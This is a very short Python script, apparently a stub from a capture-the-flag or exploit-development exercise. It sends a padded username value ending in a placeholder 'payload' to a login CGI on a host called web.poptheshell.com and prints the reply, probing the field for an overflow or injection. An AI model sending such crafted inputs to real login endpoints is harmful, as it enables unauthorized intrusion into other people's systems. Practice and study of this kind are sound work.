
import requests

for i in range(1):
    r = requests.get('http://web.poptheshell.com:50500/cgi-bin/login.cgi?username='+ 'A'*i + 'ABCD'+'payload'+'&password=&login=Login')

print(r.text)
